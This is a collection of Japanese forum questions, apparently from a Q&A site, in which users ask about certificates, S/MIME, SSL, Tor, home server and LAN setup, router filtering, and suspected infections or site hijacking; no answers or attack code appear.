電子証明書のことでいろいろ教えていただいています。 発行に際しての、調査項目と具体的な調査方法が書いてあるURLはありませんか？ たとえば、会社の住所まで行って存在確認するとか、 会社の財務状況も見せてもらっているとか、、、 これによって、どの項目がどの程度信頼できるかが決まるのではないかと考えています。 無料の証明書は、誰かがそのメールアドレスを使っている。　事だけしか保証してくれません。 有料のものの場合の具体的な調査方法が知りたいです。 よろしくお願いいたします。
wkey.meでサーバを借りました。 ドメインは、「wkeya.com」でサイトのアドレスは「http://○○○.wkeya.com」となります。 それで、Wordpressを使うことにしたのですが、SSLサーバ証明書を自分で用意しないといけないとわかり、いろいろ調べた末にStartSSLにたどり着きました。 StartSSLの設定も終わり、いざ証明書を発行しようとした所… ドメイン認証で「wkeya.com」が使えないと判明！証明書が発行せず今に至ります。このままでは、Wordpressに平文ログイン、フォームを用意したとしても平文やりとり。これでは危ないですよね？ そこで、トップレベルドメインを取ろうと思い無料のものを探した結果、「.tk」に行き着きました。 しかし、StartSSLを見ると「.tk」も未対応と来たもんです。 もうどうすればいいのか八方塞がりになってしまいました。 無料でWordpressが使え、無料でSSL暗号化通信を導入できるにはどうすればいいのでしょうか？ レンタルサーバから暗号化通信まで、びた一文払わずにやるというのは不可能なのでしょうか？ 「.free」というトップレベルドメインが開始されるとかされないとからしいのですが、StartSSLで使えるかも不透明でしょうし^^; 貧乏人はサイト作るべからずですかね？ｗ
最近、ネットワークの勉強を始めまして、 フリーソフトのGNS3　0.8.4(バージョン)をインストール致しました。 しかし、このソフトを操作する本が見つからなかったり、 webで検索しても、もう少し説明がほしかったりと設定から うまくいかず悩んでいます。 本当初級の質問で、IDL PCの設定であったり、 私がインストールしたgns3だと、ルーターが一つしか使えなかったりするので、 良い設定方法など、解る方がいらしましたら、よろしくお願いします。
無料S/MIME証明書発行での公開鍵秘密鍵 ですが、IEで、無料の証明書を申し込むときに、 RSAの公開鍵と秘密鍵を作成しなくてはならないと思うのですが、 この計算は、自分のPCの中で行われるのでしょうか、 それとも、証明書を発行してくれる会社のサーバーで計算されるのでしょうか？
S/MIMEについて調べています。 Xさんが、Aさん、Bさん、、、、Jさんの１０人とS/MIMEを使って通信するとします。 暗号はRSAとします。 Xさんは、Aさん用の証明書つきの公開鍵、Bさん用の証明書つきの公開鍵、、、、 のように、１０人分の異なる公開鍵を用意して運用することは可能ですか？ とうぜん、Aさんが使う秘密鍵は１０個となります。 個別にしておいたほうが、因数分解されたときの被害が最小限になる。 もちろん、１１番目のKさんとは暗号化しないでメールのやり取りをする。 　サンダーバードを使って上のようなことが出来ないかと考えています。 　 　使ったことが無いので、へんな質問かもしれませんがよろしくお願いいたします。
torでGOOGLE　CHROMEで接続したいのですが、Vidalia Relay Bundleというのを公式サイトから落としてインストールしました。Vidaliaを起動してコネクトしましたと英語で出るのですが、chromeのプロキシの設定で接続から設定を選びこの接続にプロキシサーバーを使うにチェックを入れています。そこにアドレス127.0.0.1としポート8118と入力しているのですがTORで接続できません。確認くんで調べてもIPが変わりません。FIREFOXだとソケット接続でTOR使った場合は接続できるのですが安全性に問題ありと出ます。CHROMEではどうすればいいのでしょうか？OSはWINDOWS7 64です。
ルーターのe0といった場合、e0は何を示しているのでしょうか。 出力インターフェースなのかと推測しているのですがあってますでしょうか。 宜しくお願いします。
microsoft security essentialsが0x80073b01のエラーがでて使えなくなりました。 コンパネ（セーフモードにしても）からアンインストールもできません。 上書きアップデートらしきものはできましたが、改善しておらず0x80073b01のエラーがでます。 システムの復元なども効果ありませんでした。 なんとか解決できる方法を教えてください。
よろしくお願いします。 弊社は30人程度の会社です。 業務用PCを集約するスイッチの老朽化に伴うリプレイスに Cisco社の以下のスイッチを候補に考えています。 　Cisco Small Business 300 SG300-52-JP ※現在はPowerConnectというDELL社の機器を使用しています 弊社業務としては9時-18時のインターネットの接続で経由するのみであるため、 価格としても手ごろですし、Gigabitのスペックも魅力です。 Ciscoのコマンドなど、ネットに情報量が多いこともメリットに感じます。 ただCisco社となると「Catalyst」などやや高額なイメージがあるのですが、 上記の機種でCatalyst L2スイッチ2960などと比べ、注意したほうが良い点などあれば、 アドバイスを頂けますでしょうか？。 （故障頻度、性能面など・・） よろしくお願いします。
こんばんわ。 できるだけセキュアなウェブサイトを作りなさいという課題で悩んでいます。 他のソフト(Poderosa等)で証明書を使用するのがあったので、Webブラウザでも以下のようなことができないかと思っています。 1)Webブラウザではhttpsでアクセスする。 2)サイトは証明書がないと見れないようにする。 3)証明書はダウンロードとかではなく、管理者からメールで送られてきた証明書ファイルを使用する。 4)証明書ファイルをインストールする時はパスワードを必要とする。 5)証明書インストール後は普通にサイトが見れる。 6)サイトが見れた後はログイン画面等別のセキュリティ設定を。 環境は仮想PCにCentOS6.4+Appachで用意しました。 6)については別のセキュリティなので無視します。 とりあえず見様見真似でopensslを使ってkey、csr、crtファイルを作り、/etc/pki/tls/certs/にセットしてみました(オレオレ証明書?)。IEからは「この Web サイトのセキュリティ証明書には問題があります。」というエラーが出ます。これは認証を受けてないからだとは思いますが、「このサイトの閲覧を続行する (推奨されません)。 」の項目があり先が見えてしまいます。続行するとアドレスバーに証明書のエラーと出ていますが、詳細を見ると強引にインストールできてしまいます。 結局のところ2)から何もできていないのですが、上記のようなサイトは作ることは可能でしょうか? 証明書は認証を必ず受けないとできないものでしょうか? 大雑羽な説明になって申し訳ありませんが上記について教えていただけないでしょうか。 参考サイト等もあれば教えていただけないでしょうか。 普段使ってるブラウザで裏でどういうことが行われているのが全く考えたことがなかったので、調べるとあまりの無知っぷりに驚いています。 よろしくお願いします。
落雷の影響らしいと、ハブを代えなくてはいけないと言われました。 確かに雷は鳴っていましたが、ルーターやハブのはいったボックスには 雷の落ちたあとなどありません。ただハブで分けたポートの幾つかがネットできません。 どういうわけで雷の影響があるのでしょうか？
暗号通信に関して、考えています。 ウィキペディア　では、Ｓ/ＭＩＭＥ　における個人の証明書に関しては、 よくある基本的な個人証明書は所有者を電子メールアドレスに結び付ける観点でのみ所有者の身元を検証し、その人の名前や職業は検証しない。 となっていて、身元確認などはしていないようです。 　これでは、証明書が本人であることを証明するものになっていないように思えます。 証明書なしで、 ある人物から、ある名前で、あるメールアドレスから、メールが届いた。 場合とあまり変わらないと考えれれますが、 個人に対して発行されたＳ/ＭＩＭＥ　証明書の意義は何でしょうか？ 個人と個人のメールを主に扱う場合に、Ｓ/ＭＩＭＥ　の証明書を確認する メールソフトにしても意味がないように思えてしまいます。 メールソフトに、証明書の確認機能が付いている場合の意義について お分かりの方、よろしくお願いいたします。
ある特定のゲーム？サイトのアクセスを禁止したいのですが 方法がわかりません ブラウザ単位では、 ChromeだけはChromeのウェブストアにあったBlack Listという機能を使い アクセスブロックできました IEでは、ツール→インターネットオプション→コンテンツ　と進みましたが、コンテンツの欄にコンテンツアドバイザーという機能自体がなくなっていました （画像添付しました） PC自体にアクセス制限をかけようと、保護者による設定から特定のプログラムを禁止できるようなので試みましたが、firefoxなどのプログラムは開けないよう設定できたのですが、 特定のサイト自体のアクセスは禁止できませんでした ゲームといっても囲碁や将棋のような部類のものなのですが そこまで好きでもないのになぜか長時間ずっとやってしまって、時間をものすごく無駄にしてしまいます 色々調べてみたのですがよく理解できなかったので もし知っている方がいれば、わかりやすく教えてくれるとありがたいです
ログインして楽天トラベルで検索したページを掲示板に載せたんですが、 楽天トラベルで検索するとその都度ページのurlが変わりますよね。 それって私のログイン時そのままに他の人からも見えたということでしょうか? つまり、ログインしたままですので、私のパソコンからは私の名前やポイントなどの情報がわかりますよね それが他の人からも見えたのでしょうか? もう少しわかりやすくいいますと http://travel.rakuten.co.jp/ ←ここから大阪新阪急ホテル等の 検索をして、そのホテルの地図アクセス部分のurlが行くたびに変わるのです 検索するたびにhttp://travel.rakuten.co.jp/HOTEL/*****/rtmap.html←の*****の数字部分が 変わるけれど表示されている画像などは同じなので これは検索した人が見ているページそのまま(つまり 名前やポイントなど出ているまま)を表示するサイトなのではと思ったんです このURLを掲示板に載せると、他人がそのサイトへいけば、 それはログインして検索した人の情報丸見え(名前やポイント)なのではないかと思ったんですが 大丈夫なのでしょうか? それからhttp://travel.rakuten.co.jp/HOTEL/*****/rtmap.htmlのサイトの一つが しばらくするとそこへアクセスするとエラー ： 404 Not Foundとなっていたのも不思議なのですが? この問題が発生してから何度かそのurlのサイトにアクセスもできたので不思議です。 初心者の質問かもしれませんが、本当に困ってますので、ぜひ教えて下さい よろしくお願いします
探しているのはタイトルに記載したソフトです。 マニアックすぎるのか検索しても全然見つかりませんでした…。 やりたいことはずっとファイルをアップロードしているソフトがあるので、そのソフトの通信速度がどの程度出ているのか計測したいのです。 ただし、他にも常時通信しているソフトがあるのでＰＣ全体の通信速度を計測しても意味がありません。 ご存知の方いましたら教えて下さい。
昨日の夜までは普通に見れていたTwitterが見れなくなってしまったのです。 何故、見れなくなったかは自分でもわからないんです！！もし、わかる方がいたら教えてください！！ ちなみに、ファイヤーフォックス？のブラウザや、Janetter、Tabtterなどで、見ても サムネの部分がバツ印になっていて見れなかったり、画像の通りになってしまうんです！（文字だけしか見れません）　 教えて！gooのサイトも初心者なのでまだよくわからないです！色々ミスってるかもしれませんが教えてください！！お願いします！
勉強と実用を目指してCentOS6.4の自宅サーバーを起動させています。 クライアントはwindows7でSSHでのサーバーの操作、 ネットや通販したりしています。 サーバーとクライアントは同一の回線ですが、 セキュリティ的にセグメント分けをした方が良いとの事なので、 下記のように分けています。 192.168.0.0/24 自宅サーバー　←─┬有線→ ルーターA ←インターネット→ 　　　　　　　　　　　　 │ PC←→ルーターB←┘ 192.168.1.0/24 サーバーが乗っ取られたとして、クライアント側のセグメントに アクセスされるのかどうか確認する方法が知りたいです。 また、クライアントからSSHで操作は行いたいですが、 サーバーからクライアントのアクセスは禁止したいです。 よろしくお願いいたします。
フリーメール、プロバイダー支給のアドレスに限らずwebメールをアカウントの乗っ取りから守る方法をを教えてください。 gmailやtwitterの乗っ取りが掲示板等で良く話題にあがっています。今回はメールに限定したいと思います。 携帯のキャリアメールのほうが安全性は高いでしょうが、webメールはそれなりに便利なのでよろしくお願いします。 私自身がすぐに思いつく方法は 1、人にアドレスを教えすぎない 2、掲示板やブログ、sns等でアドレスを公開しない 3、サイト登録用と連絡用を使い分ける。 軽く検索して見つけた方法 1、パスワード（pw）を複雑にする 2、ｐｗを使いまわさない
よろしくお願いします。 弊社は50人ほどの会社です。 業務PCやサーバは全てWindows系（クライアントはXPと７、 サーバは2008R2や2003）です。 接続は サーバ | L2スイッチ | HUBたち ←※今回の課題 | 各部署の業務PC という構成になっています。 社内の課題として部署毎に、5ポートなどの小さいHUBが 乱立し、それぞれが好き放題にカスケードやケーブル接続をしています。 これを見直し、部署毎に24ポートの機器を用意し、 各PCは、それに集約したいと考えています。 ※上層のL2スイッチにカスケードする機器を明確にしたい ここでこの24ポートの機器をHUBか、スイッチにすべきか迷っています。 HUBだと接続先MACをキャッシュせず、Windowsということもあり、 ブロードキャストの懸念があるのでは、と危惧しています。 業務PCということもあり、信頼性なども考慮すると、 集約もL2スイッチにすべきでしょうか？。 他に、判断材料として、ご意見を頂けると助かります。
お世話になります。 数日前から妻のＰＣに「セキュリティ証明書にエラーのあるコンテンツの表示がＩｎｔｅｒｎｅｔ　Ｅｘｐｌｏｒｅによりブロックされました」が出たり、「このＷｅｂサイトのセキュリティ証明書には問題があります」と表示されて「このＷｅｂサイトで提示されたセキュリティ証明書は信頼された証明機関から発行されたものではありません」と警告されます。 ＯＳ：Windows7　Ｈｏｍｅ　Ｐｒｅｍｉｕｍ　ＳＰ１ ＩＥ：１０ です。 ウィルスチェックしても異常なし。ルート証明書の更新、追加しても変化なしです。 今までの質問検索で似たようなケースや更新方法も見たのですが、解決しません。 Windows Updateもしてみましたが、変化ありません。 セキュリティ証明書エラー画面で「このサイトの閲覧を続行する」をクリックして、表示されたＷｅｂのＵＲＬ横のセキュリティ報告をクリックして証明書を表示すると、どれも発行元がＢｉｔｄｅｆｅｎｄｅｒ　Ｐｅｒｓｏｎａｌ　ＣＡ　Ｎｅｔ－Ｄｅｆｅｎｄｅｒになっています。証明パスタグをクリックして証明書の状態を確認すると「この証明書は問題ありません」となっています。 正常なＰＣからＢｉｔｄｅｆｅｎｄｅｒをエクスポートして妻のＰＣにインポートしてみましたが、変化ありません。 もう打つ手なしの状態です。ＰＣのリカバリーしか対処法はないのでしょうか。 大変困っています。よろしくお願いいたします。
http://www.something.com/aaa/bbb というURLを入力します。 この時、bbbがフォルダであればその配下の一覧が表示され、 bbbがファイルであればそのページが表示されます。 では、aaaフォルダの配下にbbbというフォルダとbbb.htmlのようなファイルが両方合った場合、ブラウザはどう解釈するのでしょうか。本によると、サーバーには両方を作る事はできないと記述がありましたが、場合によっては可能なような気がします。
こちらのIPアドレスを知っている何者かが こちらのMacBookProに標準搭載されている WebカメラとWebマイクに何かの方法でアクセスして 盗撮・盗聴される事って可能なのでしょうか？ もう一度言いますが相手がIPアドレスを知っている事が前提です。 あと、現在はMacBookProにWindows7をインストールした状態で 使用しています。 以下質問です。 １： ネットで調べてみるとWebカメラに不正にアクセスして 盗撮が可能という情報を見た事があるので心配になりました。 しかしそこで気になったのはMacBookProのWebカメラが起動すると 緑色のランプが点灯するはずなので、こちらからは分かると思うのですが この起動ランプを消した状態で相手を盗撮するなんて可能なのでしょうか？ ２： Webマイクの入力の状態は常にONにしていました。 この状態でこちらのIPを知っている相手から不正にアクセスして PCの電源が入っている時に盗聴されてしまう事ってあるのでしょうか？ 3： 対策についてです。 １についてはWebカメラを何かで塞ぐしかないのでしょうか？ ２についてですが、今はマイクのデバイスを無効にしていますが これで問題ないでしょうか？ 他に対策方法があれば教えて頂けないでしょうか？
現在ルーター付きモデムと、一般的な無線LAN搭載ルーターがあります。 各ルーターのIPアドレスを 前者を192.168.0.1、後者を192.168.1.1とすると、 後者の方は何もせずに前者のルーターと接続するのですが、 IPアドレスを逆にした場合だと接続されません。 第3オクテットが小さい数から大きい数でないと接続出来ないのでしょうか。
PCを立ち上げるたびにUniblueのSpeedUpMyPC2013が現れて勝手にシステムをスキャンし、「◯◯個のスローダウンの原因が発見されました。今、これを登録して活用しましょう！」の売り込みが出ます。これ消すためのX印がないか、在っても、クリックが効かず、消すのに毎回余計な手順がかかります。業務妨害の大迷惑です。これ、どうしてPCに常駐するようになったのか覚えがありません。これをPCから消去する方法ないでしょうか？
　以下、状況説明は常態文で書かせていただきます。 ―――――――――――――――――――――――――――――――― 　約20日間アクセスしていないパソコンから、久々にドロップボックスにアクセスした。dropbox内の各フォルダや各ファイルのアイコンの左下に青色の印（同期中）が出た。 　「おかしいな」、と思った。つまり、いじっていないファイルが多いのだから、それが緑色のチェックではなく、青色の同期中となるのは変だ。 　webを開き、dropbox.com上で見てみると、ルート直下のフォルダはあるのだが、その中身がことごとく「空」となっている。 　しばらくすると、ローカルのパソコンで、ルート直下のフォルダが青色から、緑色のチェックになった。と、予想の通り・・・さっきまであったローカルの各フォルダ下のファイル、フォルダが全て消えている。 　つまり、dorpbox.com上の「空」の状態に、ローカル・コンピュータが同期して、ルート直下のフォルダだけ残して、その下のすべてのファイル、フォルダが消滅してしまったようだ。 　もちろん、ふだん使っているパソコンは（いまいる場所にないのだが）今は電源が切れているはずである。dropbox.com上のセキュリティで確認すると、４時間前にそこからのアクティビティが記録されている（今朝、このパソコンを使った。もちろんdropbox内のファイルを削除するというような作業は少なくとも意識的にはやってない）。この他、ドロップボックスにリンクしているパソコンは１台（2週間以上電源をいれず）、Android（これは今も使用中）、ipadの計５台。 　ちなみに有料版。このようなことが起こったのは、２回目。 ―――――――――――――――――――――――――――――――― 　一応、ドロップボックスは削除ファイルを復元できるので、本質的に困っているわけではありません（しかしながら、復元は手作業なのでけっこう手間）。また、ふだん使っているコンピュータも現在は電源が入っていないはずなので、とりあえずネットから切断した状況で、そこからバックアップをとることができると思います（いま、dropbox.com上で～リンクを外しました＝帰宅して別の新しいフォルダとドロップボックスをリンクして、そこにもとのフォルダを上書きすれば、dropbox上で手作業で復元する必要がないかな・・・）。 　質問は次の通り。ネット上にもあまり情報がないようです。 （１）どうしてこんなことがおこるのでしょうか。何か対処方法がありますか？　いまのところ英文サイトを調べていませんが・・とりあえず、なんらかのアドバイスをいただけると幸いです。 （２）（補足的に）　dorpbox.com上の削除ファイルの復元作業で、効率的なやりかたがあるでしょうか？ 　今回は徹底的に解明したいと思っています。 　なんせ２度目。この先もこんなことがあると不安ですから・・・ 　
自宅サーバを作っています。素人です。 windows7　32bit でapacheのヴァージョンは2.2.25です。 http://www.adminweb.jp/apache/virtual/index2.html ここを参考にバーチャルホストを作っているのですが、 何回やっても（５～６回再インストールして作り直しました） ここの通りにやってもうまくいきません。 具体的には ServerName www.adminweb.jp ServerAdmin hogehoge@adminweb.jp DocumentRoot "D:/Apache Group/Apache2.2/adminweb_docs" CustomLog logs/adminweb.access.log common ErrorLog logs/adminweb.error.log を DocumentRoot "D:/www1" に変更した位で、これで http://www.adminweb.jp/にアクセスしても adminwebのホームページが出るだけでした。 ServerName を例えばlocalhost1としても 「このページは見つかりませんでした」と 出るだけです。 ここに書いてある内容で知っていて当たり前の事が 書いてないからかな、と考えています。 素人がここのサイトでバーチャルホストを作るに当たって 留意する事がありましたら教えてください。 どうか宜しくお願いします！
【現状】 現在、友人と共同で副業をしており帳簿等のデータを同一のEXCELファイルに記入し管理しております。 ファイルの共有方法としては ・GoogleDriveを同一アカウントでインストールし、各自PCのフォルダ内で運用 という形で作業を行っておりますが ・ファイルを保存したとき、稀に増殖する[競合１件というタイトルが追加される] （友人と同時に開いているときに起こっているものと思われる） というバグのため、ファイルを削除し記入したはずの部分をまた入力するといった、まどろっこしい作業を現在行っています。 【何をしたいのか】 ・友人との副業は投資、利益とも共同で行っているため帳簿を同一ファイルで一括管理したい ・空いた時間で行うスタイルのため、１人が帳簿つけるといった作業固定は行いたくありません 【知りたいこと】 ・ファイルを同時に開いた場合、遅く開いた方が【読み取り専用】になるオンライン共有方法はどうすればよいのでしょうか？ ・私のしたいことに対してもっと良いオンラインファイル共有方法はありませんか？ ※効率よくファイル共有できるのであれば有料のストレージを使用しても良いと思っておりますので、ストレージ（システム）の有料、無料は問いません。 回答お願いいたします。
　 　こんにちは。 　 　私は、AirStationWHR-G30１N（無線親機）×2台使って、片方は親機として、もう片方はルーター機能をOFFにして中継局として利用しています。（無線接続） 　 　そこで気づいたのが、親機と接続しているPC同士はPingで双方通るのですが、親機と接続しているPCと中継局と接続しているPCとでは、中継局と接続しているPCからはPingが通るのですが、親機と接続しているPCからはPingが通りません。 　 　色々と自分で調べてみた結果、気になる記事がありました。　↓ 　 　http://buffalo.jp/download/manual/html/air1200/r … 　 　プライバシーセパレータ機能と何か関係があるのでしょうか？ 　 　また、良い解決方法がありましたら教えてください。 　 　よろしくお願いします。 　
「縺�ｋ縺ョ縺ァ縺ッ縺ェ縺�％縺ィ縺後≧縺九′縺医∪縺吶�縲」 ↑この文字はウィルス性が高いのですか？？ 分かる方お願いします！！
PC暦は10年ほどです。Linux用のパソコンを一台自作して、そこにLinuxを入れてファイアウォール設置と通信ログの取得、侵入検知のフリーソフトの導入をしたいのですが、一度頑張ってみたものの挫折しました（汗、そこで、県内の専門の方に来ていただいて、構築を依頼したいのですが、どのぐらいの費用が掛かるのか教えていただけると幸いです。よろしくお願いします。
windows732bitを使っています。 当方、サーバ作成を初めてです。 http://www.yunayuna.net/server/apache2virtual.html ここに書かれている UseCanonicalName と #NameVirtualHost *:80 がhttpd.confにデフォルトでは記載されているようなのですが、 私のインストールしたapache2.2にはそれが記載されていません。 書き足せばいいのかと思うのですが、 何処に書き足せば良いのか分かりません。 なにとぞ宜しくお願いします。
すみません。 こちらはパソコンをよく分かっていない者ですが、 ウイルスセキュリティ　ZERO　を使用しています。 今気がついたのですが、 ウイルスセキュリティのアイコン（でしょうか？）が変わっており、 「保護が無効になっています」と出ています。 クリックしてウイルスセキュリティを開くと、 「パソコンが安全に守られていません」 とあり、 「今すぐ修正」か「閉じる」 があったのですが、「閉じる」しかクリックできません。 「閉じる」にし、よく分からないのですが 「設定」をクリックしてみてみると、 「ウイルス自動検知」というものだけが 「無効」となっています。 他は「有効」となっています。 「ウイルス自動検知」の「有効」をクリックしても 動きません。 分かり難くてすみませんが、 見慣れない事ばかりでどうしてよいか分かりません。 どうかご返答いただけないでしょうか。 どうぞよろしくお願い致します。
スーパーセキュリティゼロのウイルス検査で、「パソコン全体の検査」を実行した結果、「●●個の項目がパスワード保護されているため、検査できませんでした。これらの項目にコンテキストスキャンを実行することをおすすめします」というメッセージが出てくるのですが、コンテキストスキャンはどうやって実行したらいいのですか？「ログを表示」と「閉じる」のボタンがあるだけで、コンテキストスキャンを実行するメニューがないので方法がわかりません。 また、「パソコン全体の検査」で感染したファイルを検出した場合、ファイルを削除しても大丈夫なのでしょうか？「ウイルス対策　イベント」のメニューから削除してしまいました。ファイル名を見ても必要なのかどうかわからないので、削除して良かったのかどうか不安になりました。クッキー関係のファイルのようです。
私のPCには『スパイウェアが検出されました』『コンピュータに感染ウイルスが検出されました』などの広告が表示されるようになったのですが、これを表示させない方法はありませんか？ 追記： Yontooというソフトが原因で、コントロールパネルでこのソフトを消せばよいと情報は確認したのですが、私のソフトウェアの中には、Yontooがなく、それでも表示されてしまいます。他の原因となるソフトがあるのでしょうか？ OS：windows8
添付ののとおりGDATAからmsgが出現しました。 すべき対応が全くわかりません。。。 ご教授願えませんでしょうか？ 何卒よろしくお願い致します。
WPで作成したサイトを管理しています。 本日、ある箇所の内部リンク（不特定）をクリックすると、リンク先への遷移と同時に別ウィンドウが立ち上がり、海外のアダルトチャットのサイトへつながりました。 いつからこの現象が起こっていたかわかりませんが、本日発見しました。 ソースを確認してみましたが、今のところリンク周辺に怪しい記述は見当たりません。 また、上記減少はChromeとIEでは起こりましたが、FFでは起こりませんでした。 FTP情報を把握しているのは、私と社内でもう一人、業者が3社ほどあります。 サーバはさくらのビジネスプロです。 社内PCはセキュリティソフトにウィルスバスターを使用しており、そちらでの異常検知はありません。 業者はわかりませんが、社内の人間は、外部のPCからFTPにアクセスすることはありませんが、WPの管理画面にはアクセスすることがあります。（いずれもセキュリティソフト導入） 原因と対策等、ご教授頂けますでしょうか。 何卒よろしくお願い致します。 原因、対策など思い当たる
エアナビCD（Ver12.70）の簡単設定でクライアントマネージャーVがインストールできません。他の三個のソフトはOKです。インストール中と表示はされています。2番目にインストールだったと思うのですが最後になるのも???です。
ノートンのオフラインの使い方を教えて下さい プロダクトキーを入力してもアクティブ化が行えず　お試し期間が３０日です ネットにつながっていませんと表示されます
ＩPアドレス以外での個人特定 http://oshiete.goo.ne.jp/qa/7378889.html 1さんの書かれてるようなことができた昔って何年ぐらい前までの話でしょうか？ また、どのバージョンから改善されたんでしょうか？ ブラウザの改良点のページとかにそれは書かれてますか？
喫茶店などいくと、無線LANのキーを教えてもらうことができ、それを利用してインターネットを利用することができます。 しかし、そういった場所でネットを使用していると、他の悪意ある喫茶店内のユーザーによって私のパソコンに勝手にアクセスされ、ファイルが抜き取られてしまうなどのリスクがあると耳にしました。 これについて家電量販店の店員さんにお伺いしたところ、確かにその可能性はあるが、そういう悪意あるユーザーはほぼいないので考え過ぎだと一蹴されました。 私自身は現在、macbook airを利用しており、アンチウィルスソフトはsophos anti-virus、ファイヤーウォールを有効にし、システム環境設定で共有設定はすべてオフにしております。 私の行きつけはそういう所が多いので、このような状態から、上述の脅威に対してなんとか対策をしておきたいと考えているのですが、どのような処置を施すのが良いでしょうか。 ご回答のほどいただけましたら幸いです。それでは何卒よろしくお願いいたします。
現在、vmwareのESXiに100個のIPアドレスが存在します。 また、そのESXi上に仮想サーバが3台（A,B,C）存在します。 Aにはeth0のIPエイリアスで60個IPアドレスを設定しています Bにはeth0のIPエイリアスで40個IPアドレスを設定しています この時点でグローバルIPが枯渇してしまっていますが 更にCサーバを立て、グローバルIPを50個ほど設定したいのですが。。 AとBの仮想サーバのIPアドレスを共有して、Cサーバで利用することはできますでしょうか？ 今のところ、vyattaというルーターソフトでNATを設定すればできるのかな？ と素人ながらに調べてみたのですが、ネットワークに関してはド素人過ぎて分かりません どうかお助け願います。。
お世話になります。 ＬＡＮのPC端末から、ルーターを通して、インターネットに接続します。 ルーターにおけるポートフィルタリングを考えております。 通常、インターネットに接続する際のポート番号は、80、443と言われ、 そのために必要なＤＮＳサーバーのポート番号は、53と言われます。 これらのポート番号は、サーバー側のポート番号だと認識しております。 LANのPC端末側においては、1024～65535番のポートが割り当てられると認識しております（OSによりその中の範囲が異なる）。 つまり、LANのPC端末の1024～65535と、外部のDNSサーバー53、WEBサーバー80、443とのやりとりになると、認識しております。 また、LAN側には、公開している自社DNSサーバー、WEBサーバーはないとします。 この場合、ルーターにおけるポートフィルタリングで、 53、80、443への送信、53、80、443からの受信は通し、 53、80、443からの送信、53、80、443への受信は拒絶しても、よいように思うのですが、 いかがでしょうか。 あるいは、LANのPC端末で、インターネットを使用するということにより、 53、80、443からの送信、53、80、443への受信も、 許可しておいた方がよろしいでしょうか。 どうぞよろしくお願いします。
会社が楽天に出店しており、そのページのwebを担当しています。動くサイトがいい！と上司その他から言われ、その危険性についても言ってはいるのですが理解は薄いようです。 一応やってみようかと動作確認中、RMSに所用で問い合わせた際に推奨ブラウザがfirefoxと強く言われたのを思い出し、導入しました。 firefoxのweb開発ツールを試したところ、もちろんアマゾンやyahooではcssしか見えなかったのですが、楽天は丸見えでした。 これをコピーして使っていいのでしょうか？ これって楽天危なくないでしょうか？
Gmail のデータを　サンダーバードでやり取りしようとしています。 適当に設定したのを後で見たら、サンダーバードの設定は サーバー名　smtp.googlemail.com ポート 465 認証方式 通常のパスワード認証 接続の保護　SSL/TLS となっていました。 これを、ポート番号　587 サーバーが　smtp-auth.**** となるように変更できますか？ 普段はヤフーメールしか使っていないので設定が良く分かりません。 もしできたとして、どちらの接続がお勧めでしょうか？ よろしくお願いいたします。
よろしくお願いします。 小規模のオフィスのIT機器の管理を始めております。 ※オフィスはビルの4階にあります。 インターネットへの接続機器として、「光メディアコンバータ」というものが、 管理室にあるのですが、現在これを「UCOM」という会社と契約しています。 しかしこの会社のサポートやフォローのサービスの質が悪く、 契約を他社に変えようかと考えています。 現在、床から光ファイバケーブルが出ており、それがUCOMから貸し出された メディアコンバータに接続され、LANと接続しています。 仮に他社に変えた場合ですが、この光ファイバケーブルはそのまま残し、 メディアコンバータのみ、新規契約先の機器に交換することなどは可能なのでしょうか？。 契約先を変えることで発生する作業や費用が気になります。 アドバイスを頂けると助かります。
皆さんの個人的、意見で構いませんので、今までで、誰もが知っている一番、印象に残った重大な情報漏れ事件について教えてください。（スノーデン意外でお願いいたします。）
ヤフーメールの暗号化について考えています。 １． POP3S　で取り出し、手元のメールソフトで復号化する。 手元のメールソフトで暗号化したものを添付ファイルとして SMTPS　で送信する。 ２． ＰＯＰ３　で取り出さないで、 ＩＥ　などから、ヤフーにログインして暗号化されたデータ（添付ファイル）を ダウンローして手元で復号化する。 IE　に、BHO　などの方法で暗号化機能を追加して、ブラウザから 暗号化したメールを送信するようにする。 １と２では、どちらが安全でしょうか？
ヤフーメールを、ＰＯＰ/ＳＭＴＰで扱えることを知りました。 さらに、ＳＳＬ（ＴＬＳ）での接続にして、通信経路での暗号化もできるようです。 openssl　を使えば、そんなに苦労しなくてもなんとかなると思いますが、 ヤフーメールを暗号化（サーバー管理者にも解けない暗号化）して扱うというときに、 ＰＯＰ３Ｓ　にする意味は有りますか？ ＰＯＰ３　で十分ですか？ サーバー管理者にも解けない暗号化 については、ＡＥＳ　や　カメリア　を考えています。 アドバイスよろしくお願いいたします。 たとえば、近い将来　ＰＯＰ３Ｓ　だけになるとか。。
お知恵を拝借したく投稿させて頂きます。 現在 vsftpd で FTPサーバを立てております。 ファイルの変更、追加が可能なように、パーミッションは 777 にしていますが 当たり前ですが全員が好きにファイルを削除できてしまいます。 そこでスティッキービットを使用して、作成者以外削除できないようにしたのですが スティッキービットを設定したディレクトリ以下に、新たにディレクトリを作成した場合 新たに作成したディレクトリにはスティッキービットが継承されません。 これを新たに作成したディレクトリにも自動でスティッキービットを適用する方法は ありますでしょうか？ 分かりにくい説明で恐縮ですがお願い致します。
Ｇメールで、ＰＯＰ接続してメールを取り出すときは、 ＳＳＬ（ＴＬＳ）での接続となります。 ここで、ＲＳＡ暗号を使う場合の、公開鍵を秘密鍵のセットは 接続した瞬間に作成されるのでしょうか？ それとも、既に作ってある公開鍵と秘密鍵のセットが選ばれるのでしょうか？ もし、既に作ってあるセットの中から選ぶ場合には、 鍵のセットはサーバーの中に何セットくらい用意されているのでしょうか？ WireShark で、ＳＳＬ　の暗号化を解読してパケットの中を見る方法があるとのことで、 すこし、気になっています。 お分かりの方よろしくお願いいたします。 　 参考： https://www.softbanktech.jp/yko/2010/07/001129.h …
曖昧な情報しかありませんが、解る方がいらっしゃったら教えてください。 Windows8のpcを購入したしました。 ユーザーは2つ作っています。 Pwを掛けているにも関わらず、昼間私のいない時間帯に子供がログイン出来てしまっています。 一日中使用しているようなので使用できないようにしたいと思っていますが、 家族の話だと、pcに何かを差し込んで？ログインしているみたいです。 私のいない時はログイン出来ないような設定をするにはどうしたらいいですか？
PCに一応、（無料）セキュリティソフトを導入し、 更新をしたり、たまにはスキャンしてみたりしますが、 最近、認証のログインがやたら遅かったり、 サーバにアクセスできない事があり、 セキュリティが気になっております。 ためになるサイトともしくは、アプリ、 windowsのログの見方など、確認方法などがありましたら、 是非紹介してほしいです。 侵入されていたら、突き止められますか？ よろしくお願いします。
